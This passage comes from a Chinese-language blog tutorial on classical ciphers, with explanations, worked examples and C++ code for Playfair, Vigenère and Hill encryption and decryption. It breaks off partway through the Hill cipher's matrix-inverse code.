class="keyword">if</span> (y1 == y2)</span><br><span class="line">        &#123;</span><br><span class="line">            cleartext += text_matrix[(x1 - <span class="number">1</span>) % <span class="number">5</span>][y1];</span><br><span class="line">            cleartext += text_matrix[(x2 - <span class="number">1</span>) % <span class="number">5</span>][y2];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cleartext += text_matrix[x1][y2];</span><br><span class="line">            cleartext += text_matrix[x2][y1];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;解密后的明文为：&quot;</span> &lt;&lt; cleartext &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请选择解密还是加密，加密选1，解密选2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; res;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入密钥和一个无关字符&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; secret_key &gt;&gt; other;</span><br><span class="line">    <span class="built_in">init_matrix</span>(); <span class="comment">// 初始化源于密钥构建的字母矩阵</span></span><br><span class="line">    <span class="keyword">if</span>(res == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入明文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; cleartext;</span><br><span class="line">        <span class="built_in">init_text</span>(cleartext);<span class="comment">// 处理好的明文</span></span><br><span class="line">        <span class="built_in">encrypt</span>(cleartext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入密文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; secret_text;</span><br><span class="line">        <span class="built_in">init_text</span>(secret_text);<span class="comment">// 处理好的明文</span></span><br><span class="line">        <span class="built_in">encode</span>(secret_text);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加密</span></span><br><span class="line">请选择解密还是加密，加密选<span class="number">1</span>，解密选<span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">请输入密钥和一个无关字符</span><br><span class="line">iscbupt x</span><br><span class="line">iscbuptadefghklmnoqrvwxyz</span><br><span class="line">请输入明文</span><br><span class="line">steganographia</span><br><span class="line">加密后的密文为：tgtltonhoeafcp</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line">    请选择解密还是加密，加密选<span class="number">1</span>，解密选<span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">请输入密钥和一个无关字符</span><br><span class="line">iscbupt x</span><br><span class="line">iscbuptadefghklmnoqrvwxyz</span><br><span class="line">请输入密文</span><br><span class="line">tgtltonhoeafcp</span><br><span class="line">解密后的明文为：steganographia</span><br></pre></td></tr></table></figure><h4 id="2-2Vigenere-密码">2.2Vigenere 密码</h4><h5 id="介绍-5">介绍</h5><p>维吉尼亚密码(Vigenere Cipher)是由法国密码学家 Blaise de Vigenere 于 1858 年提出的种代换密码，它是多表代换密码的典型代表。<br>定义:设<code>m</code>为某一固定的正整数,<code>P</code>、<code>C</code>和<code>K</code> 分别为明文空间、密文空间和密钥空间,并且 $P=K=C=(Z_{26})^m$,对一个密钥 $k=(k_1,k_2…k_m)$,定义维吉尼亚密码的加密函数为:</p><p>$$<br>e_k(x_1,x_2…x_m)=(x_1+k_1,x_2 + k_2…x_m+k_m)<br>$$</p><p>与之对应的解密函数为:</p><p>$$<br>d_k(y_1,y_2…y_m)=(y_1-k_1,y_2-k_2…y_m-k_m)<br>$$</p><p>其中$k=(k_1,k_2…k_m)$是一个长为<code>m</code> 的密钥字,密空间的大小为 $26^m$,所以对一个相对小的<code>m</code>,穷举密钥也需要很长的时间。如<code>m=7,</code>则密空间大小超过$8×10^9$,所以手工搜索非常困难。当明文的长度超过<code>m</code>时,可将明文串按长度<code>m</code>分组,然后对每一组使用密钥<code>k</code>加密。</p><p>设密钥为<code>iscbupt</code>,则对应的数字化的密钥<code>k=(8,18,2,1,20,15,19)</code>,待加密的明文是<code>cyber greatwall corporation</code>,首先把明文字母转换为数字,然后把明文字母每<code>7</code>个分为一组,使用密钥字进行模<code>26</code>下的加密操作,具体计算过程如下所示。<br><img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_74d8ea9e76-10.png" alt="10.png"><br>加密表中第一行为已分组明文字母,每组之间用空格隔开;第二行是与明文字母对应的数字;第三行是加密密钥;第四行为加密后的密文对应的数字，即第二行数字与第三行对应的数字模<code>26</code>和的结果;最后一行是得到的密文<code>KQDFLVKMSVXUAEKGTQIGTBAQO</code>。同样把密文按每组 <code>7</code>个进行分组，然后进行解密得如下解密表。<br><img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_71e9d5eb76-11.png" alt="11.png"><br>解密表与加密表的第四行计算操作是不同的,解密表中第四行是由第二行与第三行的模<code>26 </code>差得到的,其他行的操作与加密表基本相同。由解密表可以明显看出,明文字符通过解密函数得到恢复。<br>为了更快根据明文找出密文,或者依据密文推出明文,我们构造了下表，表中第一行为<code>26 </code>个明文字符,第一列代表<code>26</code>个密钥字符,根据下表进行的加密解密过程如下。<br>(1)加密过程:明文字母力对应的列和密钥字母<code>k</code>对应的行的交叉点就是加密后的密文字母<code>c</code>。<br>(2)解密过程:在密钥字母 <code>k </code>对应的行找到相应的密文字母<code> c</code>,则<code>c </code>所在列对应的明文字母即是<code>p</code>。</p><blockquote><p>设密钥为<code>iscbupt</code>,需加密的明文字母是<code>sorcery</code>,则根据维吉尼亚表和加密规则易得密文为<code>AGTDYGR</code>。同样根据上述维吉尼亚表和解密规则易知明文为<code>sorcery</code>根据维吉尼亚表的启发,还可以设计出其他多表密码体制,如把维吉尼亚表对应的行逆序排列，就可以得到博福特密码(Beaufort Cipher)表</p></blockquote><p><img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_ad2d35a276-7.jpg" alt="7.jpg"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//体贴的我打出来了表单（当然是计算机算的，下面代码有）</span></span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">BCDEFGHIJKLMNOPQRSTUVWXYZA</span><br><span class="line">CDEFGHIJKLMNOPQRSTUVWXYZAB</span><br><span class="line">DEFGHIJKLMNOPQRSTUVWXYZABC</span><br><span class="line">EFGHIJKLMNOPQRSTUVWXYZABCD</span><br><span class="line">FGHIJKLMNOPQRSTUVWXYZABCDE</span><br><span class="line">GHIJKLMNOPQRSTUVWXYZABCDEF</span><br><span class="line">HIJKLMNOPQRSTUVWXYZABCDEFG</span><br><span class="line">IJKLMNOPQRSTUVWXYZABCDEFGH</span><br><span class="line">JKLMNOPQRSTUVWXYZABCDEFGHI</span><br><span class="line">KLMNOPQRSTUVWXYZABCDEFGHIJ</span><br><span class="line">LMNOPQRSTUVWXYZABCDEFGHIJK</span><br><span class="line">MNOPQRSTUVWXYZABCDEFGHIJKL</span><br><span class="line">NOPQRSTUVWXYZABCDEFGHIJKLM</span><br><span class="line">OPQRSTUVWXYZABCDEFGHIJKLMN</span><br><span class="line">PQRSTUVWXYZABCDEFGHIJKLMNO</span><br><span class="line">QRSTUVWXYZABCDEFGHIJKLMNOP</span><br><span class="line">RSTUVWXYZABCDEFGHIJKLMNOPQ</span><br><span class="line">STUVWXYZABCDEFGHIJKLMNOPQR</span><br><span class="line">TUVWXYZABCDEFGHIJKLMNOPQRS</span><br><span class="line">UVWXYZABCDEFGHIJKLMNOPQRST</span><br><span class="line">VWXYZABCDEFGHIJKLMNOPQRSTU</span><br><span class="line">WXYZABCDEFGHIJKLMNOPQRSTUV</span><br><span class="line">XYZABCDEFGHIJKLMNOPQRSTUVW</span><br><span class="line">YZABCDEFGHIJKLMNOPQRSTUVWX</span><br><span class="line">ZABCDEFGHIJKLMNOPQRSTUVWXY</span><br></pre></td></tr></table></figure><h5 id="C-源码-6">C++源码</h5><blockquote><p>因为这个算法不难，所以就不模拟了，直接用表了(～￣ ▽ ￣)～</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>+<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> vigenere[<span class="number">26</span>][<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line">string cleartext; <span class="comment">// 明文</span></span><br><span class="line">string secret_text; <span class="comment">// 密文</span></span><br><span class="line">string secret_key; <span class="comment">// 密钥</span></span><br><span class="line">string clear_key; <span class="comment">// 明钥（用于解密）</span></span><br><span class="line"><span class="type">int</span> res; <span class="comment">// 判断加密还是解密</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>, t = <span class="number">0</span>; i &lt; <span class="number">26</span>; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; j ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> k = (j + t) % <span class="number">26</span>;</span><br><span class="line">            vigenere[i][j] = <span class="string">&#x27;A&#x27;</span> + k;</span><br><span class="line">        &#125;</span><br><span class="line">        t ++ ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(string m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m.<span class="built_in">size</span>(); i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> k = i % secret_key.<span class="built_in">size</span>();</span><br><span class="line">        secret_text += vigenere[m[i] - <span class="string">&#x27;a&#x27;</span>][secret_key[k] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;加密后的密文为：&quot;</span> &lt;&lt; secret_text &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encode</span><span class="params">(string m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m.<span class="built_in">size</span>(); i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> k = i % secret_key.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; j ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(vigenere[secret_key[k] - <span class="string">&#x27;a&#x27;</span>][j] == m[i]) cleartext += (<span class="string">&#x27;a&#x27;</span> + j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;解密后的明文为：&quot;</span> &lt;&lt; cleartext &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请选择解密还是加密，加密选1，解密选2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; res;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入密钥符&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; secret_key;</span><br><span class="line">    <span class="built_in">init</span>();<span class="comment">//初始化表单（外挂）</span></span><br><span class="line">    <span class="keyword">if</span>(res == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入明文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; cleartext;</span><br><span class="line">        <span class="built_in">encrypt</span>(cleartext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入密文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; secret_text;</span><br><span class="line">        <span class="built_in">encode</span>(secret_text);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加密</span></span><br><span class="line">请选择解密还是加密，加密选<span class="number">1</span>，解密选<span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">请输入密钥符</span><br><span class="line">iscbupt</span><br><span class="line">请输入明文</span><br><span class="line">cybergreatwallcorporation</span><br><span class="line">加密后的密文为：KQDFLVKMSVXUAEKGTQIGTBAQO</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line">请选择解密还是加密，加密选<span class="number">1</span>，解密选<span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">请输入密钥符</span><br><span class="line">iscbupt</span><br><span class="line">请输入密文</span><br><span class="line">KQDFLVKMSVXUAEKGTQIGTBAQO</span><br><span class="line">解密后的明文为：cybergreatwallcorporation</span><br></pre></td></tr></table></figure><h4 id="2-3-Hill-密码">2.3 Hill 密码</h4><h5 id="介绍-6">介绍</h5><p>希尔密码(Hill Cipher)是由数学家$ Lester Hil$于 1929 在 $American MathematicalMonthly$ 杂志上首次提出的。Hill 密码的基本思想是利用 $Z_{26}$上的线性变换把<code>n</code>个连续的明文字母替换为<code>n </code>个密文字母。这个替换是由密钥决定的,而这个密钥是一个变换矩阵,解密时<strong>只需对密文做一次逆变换</strong>即可。其实 Hill 密码实质上就是通过一个变换矩阵把明文变换为密文的一种密码体制。</p><p>定义：设<code>n</code>为某一固定的正整数,<code>P</code>、<code>C</code>和<code>K</code> 分别为明文空间、密文空间和密钥空间，并且$P=C=(Z_{26})$,密钥$k=(k_{ij})<em>{n×n}$,是一个<code>n×n</code> 的非奇异矩阵(行列式 $det(k)\not=0$),且满足<code>gcd(det(k),26)=1</code>,即满足 $Z</em>{26}$上<code> det(k)</code>和 <code>26</code> 互素,从而保证了密钥矩阵的逆矩阵存在。对明文序列$p=(p_1,p_2…p_n)\in P$,其对应密文记为$c=(c_1,c_2…c_n)\in C$,则 Hill 密码的加密函数定义为:<br><img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_c3bce6f776-12.png" alt="12.png"></p><!--$$--><!--(c_1,c_2,...,c_n) \equiv (p_1,p_2,...,p_n)--><!--\begin{equation}--><!--\begin{pmatrix}--><!--k_{11} & k_{12} & \cdots & k_{1n}\\--><!--k_{21} & k_{22} & \cdots & k_{2n}\\--><!--\vdots & \vdots & \ddots & \vdots \\--><!--k_{n1} & k_{n2} & \cdots & k_{nn}\\--><!--\end{pmatrix}--><!--\end{equation}--><!--(mod 26)--><!--$$--><p>写成矩阵简化形式为：<br><img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_cb6527d776-13.png" alt="13.png"></p><!--$$--><!--[c]_{1\times n}\equiv([p]_{1\times n}\times[k]_{n\times n})(mod 26)--><!--$$--><p>在 Hill 密码的加密函数等式的两端分别乘以 $k ^{-1}$,则得到其解密函数的解析式:<br><img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_d137b61676-14.png" alt="14.png"></p><!--$$--><!--(p_1,p_2,...,p_n) \equiv (c_1,c_2,...,c_n)--><!--\times--><!--\begin{equation}--><!--\begin{pmatrix}--><!--k_{11} & k_{12} & \cdots & k_{1n}\\--><!--k_{21} & k_{22} & \cdots & k_{2n}\\--><!--\vdots & \vdots & \ddots & \vdots \\--><!--k_{n1} & k_{n2} & \cdots & k_{nn}\\--><!--\end{pmatrix} ^{-1}--><!--\end{equation}--><!--(mod 26)--><!--$$--><p>写成矩阵简化形式为：<br><img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_d61b0d5876-15.png" alt="15.png"></p><!--$$--><!--[p]_{1 \times n} \equiv ([c]_{1 \times n} \times [k]_{n \times n}^{-1})(mod 26)--><!--$$--><p>设待加密的明文是<code>cyber</code>,数字化后为 <code>2,24,1,4,17</code>,使用的密钥为<br><img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_47da949e76-16.png" alt="16.png"><br>则密文为<code>WRTRV</code>。同理由于<code>k</code>是非奇异的,所以在$ Z_{26} $上必然存在逆矩阵:<br><img src="https://cdn.acwing.com/media/article/image/2023/10/29/169037_797e924f76-17.png" alt="17.png"><br>则明文为<code>cyber</code><br>Hill 密码将长消息分组,分组的长度由矩阵的维数决定。它与 <code>Playfair </code>密码相比,更好地隐藏了单字母的统计特性,所以 <code>Hill</code> 密码能较好地抵抗统计分析法,对抗惟密文攻击的强度较高,但易受到已知明文攻击。</p><h5 id="C-源码-7">C++源码</h5><blockquote><p>这个算法难就难在算逆元，因为我没学过，直接去网上找了一篇，有兴趣就看下吧 <a href="https://blog.csdn.net/kongtaoxing/article/details/126962613">点击这里直达</a></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>+<span class="number">10</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mod(a) (((a % 26) + 26) % 26)  <span class="comment">//把负数的模计算成正数</span></span></span><br><span class="line"></span><br><span class="line">string cleartext; <span class="comment">// 明文</span></span><br><span class="line">string secret_text; <span class="comment">// 密文</span></span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; secret_key; <span class="comment">// 密钥</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; clear_key; <span class="comment">// 明钥（密钥逆矩阵）</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> res; <span class="comment">// 判断加密还是解密</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">divmod</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;   <span class="comment">//模26除法</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>((a + <span class="number">26</span> * i) % b == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">mod</span>((a + <span class="number">26</span> * i) / b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;   <span class="comment">//其实是10000以内没有找到🤣，还可以用直接乘逆元的方式求模的除法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">det</span><span class="params">(vector&lt;<span class="type">int</span>&gt; arr, <span class="type">int</span> len)</span> </span>&#123;    <span class="comment">//行列式求值</span></span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">1</span>) ans = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; <span class="built_in">yuzi</span>((len - <span class="number">1</span>) * (len - <span class="number">1</span>));   <span class="comment">//创建余子式矩阵</span></span><br><span class="line">        <span class="type">int</span> move = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                move = i &gt; j ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; len - <span class="number">1</span>; k ++) &#123;</span><br><span class="line">                    yuzi[j * (len - <span class="number">1</span>) + k] = arr[(j + move) * len + k + <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> flag = (i % <span class="number">2</span> == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">-1</span>);</span><br><span class="line">            ans += flag * arr[i * len] * <span class="built_in">det</span>(yuzi, len - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">mod</span>(ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inverse</span><span class="params">(vector&lt;<span class="type">int</span>&gt; arr)</span> </span>&#123;   <span class="comment">//求mod26的逆矩阵</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; inver;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">sqrt</span>(arr.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">det</span>(arr, len) == <span class="number">0</span>) cout &lt;&lt; <span class="string">&quot;秘钥矩阵的行列式值为0，无法解密&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="type">int</span> _det = <span class="built_in">det</span>(arr, len);</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">bansui</span><span class="params">(len * len)</span></span>;   <span class="comment">//伴随矩阵</span></span><br><span 